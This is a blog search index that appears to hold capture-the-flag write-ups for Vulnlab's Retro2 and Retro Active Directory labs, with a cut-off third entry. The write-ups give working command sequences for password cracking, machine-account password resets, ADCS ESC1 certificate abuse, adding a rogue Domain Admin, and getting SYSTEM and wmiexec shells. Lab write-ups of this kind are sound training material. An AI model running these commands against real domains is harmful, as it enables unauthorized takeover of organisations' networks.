<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>VL-Retro2</title>
      <link href="/2025/03/14/VL-Retro2/"/>
      <url>/2025/03/14/VL-Retro2/</url>
      
        <content type="html"><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE      REASON          VERSION</span><br><span class="line">53/tcp    open  domain       syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)</span><br><span class="line">88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos </span><br><span class="line">135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)</span><br><span class="line">464/tcp   open  kpasswd5?    syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped   syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped   syn-ack ttl 127</span><br><span class="line">49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-03-11T18:29:27</span><br><span class="line">|_  start_date: 2025-03-11T18:27:35</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2:1:0: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 22122/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 47750/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 39335/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 23565/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1</span><br><span class="line">|   Computer name: BLN01</span><br><span class="line">|   NetBIOS computer name: BLN01\x00</span><br><span class="line">|   Domain name: retro2.vl</span><br><span class="line">|   Forest name: retro2.vl</span><br><span class="line">|   FQDN: BLN01.retro2.vl</span><br><span class="line">|_  System time: 2025-03-11T19:29:28+01:00</span><br><span class="line">|_clock-skew: mean: -2h19m57s, deviation: 34m36s, median: -1h59m59s</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)</p><h2 id="Fast-exploit"><a href="#Fast-exploit" class="headerlink" title="Fast exploit"></a>Fast exploit</h2><p>We can see that its Windows Server 2008 R2 trying the most basic exploits for this version we see that its vulnerable to <code>nopac</code> and <code>zerologon</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb BLN01.retro2.vl -M zerologon</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb BLN01.retro2.vl -u &quot;user&quot; -p &quot;pass&quot; -M nopac</span><br></pre></td></tr></table></figure><p>There are plenty tutorials for how to use <code>zerologon</code> and the <code>nopac</code> exploits this blog post will focus on the “intended way”</p><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.100.199 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Retro2/guest0smb2.png" alt="guest0smb2"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.100.199/Public -U &#x27;guest&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Retro2/public-shares.png" alt="public-shares"><br>There is one file in the DB folder named <code>staff.accdb</code> we will download that file to our system</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get staff.accdb</span><br></pre></td></tr></table></figure><p>The <code>.accdb</code> is a is an <em>Access 2007&#x2F;2010 Database file</em> used in and opened by Access 2007+, we can use office2john to get the hash and crack it as its password protected</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">office2john staff.accdb</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --format=office --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Retro2/john-crack.png" alt="john-crack"><br>Using the password <code>class08</code>, we unlock the microsoft access database:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapreader:&lt;REDACTED&gt;</span><br></pre></td></tr></table></figure><h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -u &quot;ldapreader&quot; -p &quot;&lt;REDACTED&gt;&quot; -d retro2.vl -dc BLN01.retro2.vl -ns 10.10.70.92 -c ALL --zip</span><br></pre></td></tr></table></figure><p>OR</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap retro2.vl -u &#x27;ldapreader&#x27; -p &#x27;&lt;REDACTED&gt;&#x27; --bloodhound --dns-server &lt;ip&gt; -c All --dns-tcp</span><br></pre></td></tr></table></figure><p>The above command will get us a zip file that we will use on bloodhound and find our exploitation path<br><img src="/images/Retro2/bloodhound.png" alt="bloodhound"></p><h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><p>First we will try to use the username as the password lowercase for the machine account <code>fs01$</code>(Refer to this blog post that describes why this happens <a href="https://www.xmco.fr/en/active-directory-en/part-5-machine-accounts-in-the-active-directory/">https://www.xmco.fr/en/active-directory-en/part-5-machine-accounts-in-the-active-directory/</a>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb retro2.vl -u &#x27;fs01$&#x27; -p &#x27;fs01&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Retro2/fs01-account.png" alt="fs01-account"><br>we need to change the password so we can use that machine account with the password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-changepasswd &#x27;retro2.vl/fs01$&#x27;:&#x27;fs01&#x27;@retro2.vl -newpass StrongP@ss1234 -dc-ip BLN01.retro2.vl -p rpc-samr</span><br></pre></td></tr></table></figure><h4 id="GenericWrite"><a href="#GenericWrite" class="headerlink" title="GenericWrite"></a>GenericWrite</h4><p>We have control over FS01, we can take advantage of the <strong>GenericWrite</strong> permission we previously identified. Typically, this permission can be abused using one of the following techniques:</p><ul><li><strong>Shadow Credentials</strong> (applicable to Windows Server 2016 and later)</li><li><strong>Targeted Kerberoasting</strong> (only effective if the target’s password is weak and crackable)</li><li><strong>Resource-Based Constrained Delegation</strong></li></ul><p>As we are dealing with a Windows Server 2008 none of them will work so we will use another way we can modify another attribute <strong>unicodePwd</strong> which allows us to reset the password for <strong>“ADMWS01$”</strong> (Big thanks to serotonin for this exploitation path <a href="https://seriotonctf.github.io/2024/08/25/Retro2-Vulnlab/">https://seriotonctf.github.io/2024/08/25/Retro2-Vulnlab/</a> )</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc password &#x27;ADMWS01$&#x27; Passw0rd1 -U retro2.vl/&#x27;fs01$&#x27;%StrongP@ss1234 -S BLN01.retro2.vl</span><br></pre></td></tr></table></figure><h4 id="AddMember"><a href="#AddMember" class="headerlink" title="AddMember"></a>AddMember</h4><p>We will add the user we own <code>ldapreader</code> to the group <code>Services</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc group addmem &quot;Services&quot; &quot;ldapreader&quot; -U &quot;retro2.vl&quot;/&quot;ADMWS01$&quot;%&quot;Passw0rd1&quot; -S BLN01.retro2.vl</span><br></pre></td></tr></table></figure><p>Then we can just RDP to the machine:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.70.92 /u:&#x27;ldapreader&#x27; /p:&#x27;&lt;REDACTED&gt;&#x27; /d:retro2.vl /tls-seclevel:0</span><br></pre></td></tr></table></figure><h2 id="Priv-Escalation"><a href="#Priv-Escalation" class="headerlink" title="Priv Escalation"></a>Priv Escalation</h2><p>There is a great blog post by <a href="https://itm4n.github.io/">itm4n</a> on a no-fix vulnerability<br>    <a href="https://itm4n.github.io/windows-registry-rpceptmapper-eop/">https://itm4n.github.io/windows-registry-rpceptmapper-eop/</a><br>    <a href="https://itm4n.github.io/windows-registry-rpceptmapper-exploit/">https://itm4n.github.io/windows-registry-rpceptmapper-exploit/</a></p><p>Now with a tool named <a href="https://github.com/itm4n/Perfusion">Perfusion</a> we can get a system shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Perfusion.exe -c cmd -i</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=bec17ffc-be95-49d1-915e-35c53826e85f" title="https://api.vulnlab.com/api/v1/share?id=bec17ffc-be95-49d1-915e-35c53826e85f">https://api.vulnlab.com/api/v1/share?id=bec17ffc-be95-49d1-915e-35c53826e85f</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Retro</title>
      <link href="/2025/03/11/VL-Retro/"/>
      <url>/2025/03/11/VL-Retro/</url>
      
        <content type="html"><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-10 21:02:43Z)</span><br><span class="line">135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp  open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: RETRO</span><br><span class="line">|   NetBIOS_Domain_Name: RETRO</span><br><span class="line">|   NetBIOS_Computer_Name: DC</span><br><span class="line">|   DNS_Domain_Name: retro.vl</span><br><span class="line">|   DNS_Computer_Name: DC.retro.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-03-10T21:03:27+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=DC.retro.vl</span><br><span class="line">| Issuer: commonName=DC.retro.vl</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-03-09T21:01:16</span><br><span class="line">| Not valid after:  2025-09-08T21:01:16</span><br><span class="line">| MD5:   57df:2f2a:42f8:12ba:1acb:785c:ad91:ac2b</span><br><span class="line">| SHA-1: 6a2d:a6d3:9d5e:38a0:ebd7:8775:5f7f:1659:3733:78eb</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -2h00m00s, deviation: 0s, median: -2h00m00s</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 48062/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 9402/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 6737/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 6198/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-03-10T21:03:28</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br></pre></td></tr></table></figure><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>As there is not much exposed on the machine first we will try smb null session</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.98.48 -N</span><br></pre></td></tr></table></figure><p><img src="/images/Retro/SMB-Nullses.png" alt="SMB-Nullses"><br>We can see that we can use null session and there is a <code>Trainees</code> share that looks interesting</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.98.48/Trainees -N</span><br></pre></td></tr></table></figure><p>Inside the share there is a <code>Important.txt</code> file we will get it to our machine with the below command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get Important.txt</span><br></pre></td></tr></table></figure><p>Opening that file we see the following:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Dear Trainees,</span><br><span class="line"></span><br><span class="line">I know that some of you seemed to struggle with remembering strong and unique passwords.</span><br><span class="line">So we decided to bundle every one of you up into one account.</span><br><span class="line">Stop bothering us. Please. We have other stuff to do than resetting your password every day.</span><br><span class="line"></span><br><span class="line">Regards</span><br><span class="line"></span><br><span class="line">The Admins</span><br></pre></td></tr></table></figure><p>Now we will start searching for that account and try to brute force the password, we can use <code>impacket-lookupsid</code> to get some valid usernames as we have access to the null session.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid guest@10.10.98.48 -no-pass</span><br></pre></td></tr></table></figure><p><img src="/images/Retro/lookupsid.png" alt="lookupsid"><br>The account that the trainees use is called <code>trainee</code> (we could have guessed it but ok)</p><p>After spraying it with some common password we tried to put the username as the password and it worked<br><img src="/images/Retro/trainee-smb.png" alt="trainee-smb"><br>Also we can see that now we have read access to the Notes share</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.98.48/Notes -U &quot;trainee&quot;</span><br></pre></td></tr></table></figure><p>And we download the file named <code>ToDo.txt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get ToDo.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Thomas,</span><br><span class="line"></span><br><span class="line">after convincing the finance department to get rid of their ancienct banking software</span><br><span class="line">it is finally time to clean up the mess they made. We should start with the pre created</span><br><span class="line">computer account. That one is older than me.</span><br><span class="line"></span><br><span class="line">Best</span><br><span class="line"></span><br><span class="line">James </span><br></pre></td></tr></table></figure><p>After reading the <code>ToDo.txt</code> i started digging around for some info on old computer accounts and how they were created, and i found in an article the following</p><p>Note : In older Active Directories, it is possible to find accounts marked as “Assign this computer account as a pre-Windows 2000.” The password for these machine accounts is the lowercase name of the machine account itself. For example, the password for the machine account “XMCO$” would be “xmco”.</p><p><a href="https://www.xmco.fr/en/active-directory-en/part-5-machine-accounts-in-the-active-directory/">https://www.xmco.fr/en/active-directory-en/part-5-machine-accounts-in-the-active-directory/</a></p><h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><p>I used bloodhound python to get a better understanding of the domain</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -u &quot;trainee&quot; -p &quot;trainee&quot; -d retro.vl -dc DC.retro.vl -ns 10.10.98.48 --zip</span><br></pre></td></tr></table></figure><p>Using the below query we can see there are 2 machines:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (n:Computer) RETURN n</span><br></pre></td></tr></table></figure><p><img src="/images/Retro/mchine-accounts.png" alt="mchine-accounts"><br>We will try to use the machine account name <code>Banking$</code> with the password <code>banking</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.98.48 -u &#x27;Banking$&#x27; -p banking</span><br></pre></td></tr></table></figure><p>The error that we get is <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code> this can be fixed by changing password for the machine account.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-changepasswd &#x27;retro.vl/BANKING$&#x27;:banking@10.10.98.48 -newpass StrongP@ss1234 -dc-ip 10.10.98.48 -p rpc-samr</span><br></pre></td></tr></table></figure><h3 id="AD-CS"><a href="#AD-CS" class="headerlink" title="AD CS"></a>AD CS</h3><p>Running certipy to find any templates that may be vulnurable:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u &#x27;banking$&#x27;@retro.vl -p StrongP@ss1234 -dc-ip 10.10.98.48</span><br></pre></td></tr></table></figure><p>After opening the text file we see that one template is vulnerable to <code>ESC1</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : RetroClients</span><br><span class="line">    Display Name                        : Retro Clients</span><br><span class="line">    Certificate Authorities             : retro-DC-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : None</span><br><span class="line">    Private Key Flag                    : 16842752</span><br><span class="line">    Extended Key Usage                  : Client Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 1 year</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 4096</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : RETRO.VL\Domain Admins</span><br><span class="line">                                          RETRO.VL\Domain Computers</span><br><span class="line">                                          RETRO.VL\Enterprise Admins</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : RETRO.VL\Administrator</span><br><span class="line">        Write Owner Principals          : RETRO.VL\Domain Admins</span><br><span class="line">                                          RETRO.VL\Enterprise Admins</span><br><span class="line">                                          RETRO.VL\Administrator</span><br><span class="line">        Write Dacl Principals           : RETRO.VL\Domain Admins</span><br><span class="line">                                          RETRO.VL\Enterprise Admins</span><br><span class="line">                                          RETRO.VL\Administrator</span><br><span class="line">        Write Property Principals       : RETRO.VL\Domain Admins</span><br><span class="line">                                          RETRO.VL\Enterprise Admins</span><br><span class="line">                                          RETRO.VL\Administrator</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : &#x27;RETRO.VL\\Domain Computers&#x27; can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure><p>We can exploit ESC1 we will use the below command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u &quot;banking$&quot; -p &quot;StrongP@ss1234&quot; -target retro.vl -upn administrator@retro.vl -ca retro-DC-CA -template RetroClients</span><br></pre></td></tr></table></figure><p><img src="/images/Retro/ESC01-Certipy.png" alt="ESC01-Certipy"><br>It fails with <code>CERTSRV_E_KEY_LENGTH</code> looking into it we find this article <a href="https://www.gradenegger.eu/en/the-request-for-certificates-via-the-network-device-registration-service-ndes-fails-with-the-error-message-the-public-key-does-not-meet-the-minimum-size-required-by-the-specified-cer/">https://www.gradenegger.eu/en/the-request-for-certificates-via-the-network-device-registration-service-ndes-fails-with-the-error-message-the-public-key-does-not-meet-the-minimum-size-required-by-the-specified-cer/</a></p><p>That states:</p><p>This error occurs if the key length in the certificate request is less than configured in the certificate template configured for the NDES server. Thus, either the “Minimum Key Length” in the certificate template must be reduced, or a new certificate request with a sufficiently large key must be formed and sent to the NDES server.</p><p>Looking back at the certipy output we see that tamplate requires a minimum RSA key of 4096 Bytes</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u &#x27;BANKING$&#x27;@retro.vl -p &quot;StrongP@ss1234&quot; -dc-ip 10.10.98.48 -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -key-size 4096</span><br></pre></td></tr></table></figure><h4 id="First-way"><a href="#First-way" class="headerlink" title="First way"></a>First way</h4><p>Now that we have the <code>administrator.pfx</code> we will spawn an ldap shell and create a new user and add him to Domain Admins</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip 192.168.0.100 -ldap-shell</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add_user EvilAdmin  </span><br><span class="line">add_user_to_group EvilAdmin &#x27;Domain Admins&#x27;</span><br></pre></td></tr></table></figure><h4 id="Second-way"><a href="#Second-way" class="headerlink" title="Second way"></a>Second way</h4><p>We will get a valid TGT as administrator</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip 10.10.98.48</span><br></pre></td></tr></table></figure><p>Using that hash to get a shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=administrator.ccache impacket-wmiexec -k -no-pass -dc-ip 10.10.98.48 retro.vl/administrator@DC.retro.vl</span><br></pre></td></tr></table></figure><p>Using <code>impacket-wmiexec</code> we can get a shell and grab our flags</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec EvilAdmin:&#x27;l0KHCK8F0Y?&lt;&amp;_T&#x27;@10.10.98.48</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=ddf64ae9-fcad-498e-84ef-89aa99b6a242">https://api.vulnlab.com/api/v1/share?id=ddf64ae9-fcad-498e-84ef-89aa99b6a242</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Lock</title>
      <link href="/2025/03/10/VL-Lock/"/>
      <url>/2025/03/10/VL-Lock/</url>
      
